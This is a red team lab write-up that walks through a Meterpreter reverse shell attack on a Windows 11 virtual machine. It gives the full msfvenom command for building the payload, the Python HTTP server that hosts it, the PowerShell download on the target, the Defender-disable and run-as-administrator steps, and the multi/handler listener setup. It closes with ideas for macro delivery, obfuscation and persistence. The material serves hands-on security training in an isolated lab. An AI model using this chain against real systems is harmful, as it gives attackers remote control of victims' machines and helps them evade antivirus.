# 🧪 Red Team Lab: REMCOS Reverse Shell via Executable Delivery

This lab demonstrates a basic but effective red team exercise: delivering a raw Metasploit-generated .exe payload to a Windows 11 VM and catching a reverse Meterpreter shell using Kali Linux. This is a foundational training scenario focused on payload generation, listener setup, and reverse shell execution in a controlled virtual lab.

🖥️ Lab Setup

Host OS

Windows 11 (Pro)

Attacker Machine

Kali Linux (VirtualBox, Host-Only Network)

Network Type

Host-Only Adapter on both VMs

⚙️ Step-by-Step Instructions

## 1. Generate Payload on Kali

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o remcos_clone.exe

## 2. Host the Payload via Python Server

python3 -m http.server 8000

## 3. On Windows VM: Download the Payload

Invoke-WebRequest -Uri http://192.168.56.101:8000/remcos_clone.exe -OutFile remcos_clone.exe

## 4. Disable Defender + Run Payload

Turn off Microsoft Defender Real-Time Protection

Right-click remcos_clone.exe > Run as Administrator

## 5. Start Listener on Kali

msfconsole

Then in the console:

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
run

✅ You should see:

[*] Started reverse TCP handler on 192.168.56.101:4444
[*] Meterpreter session 1 opened

## 📸 Screenshot Checklist

Kali IP Config – ip a showing 192.168.56.101

Payload Generation Output – full msfvenom result

Python HTTP Server Running – terminal showing Serving HTTP on 0.0.0.0 port 8000

Windows IPConfig – ipconfig output

PowerShell File Download – full PowerShell window

Defender Disabled – screenshot of Defender UI toggled off

File Explorer showing .exe – remcos_clone.exe on Desktop

Metasploit Listener Output – session opened message

✅ Next Phase Ideas

Re-delivery using HTA or macro Word doc

Obfuscation with Veil or msbuild

Persistence + privilege escalation

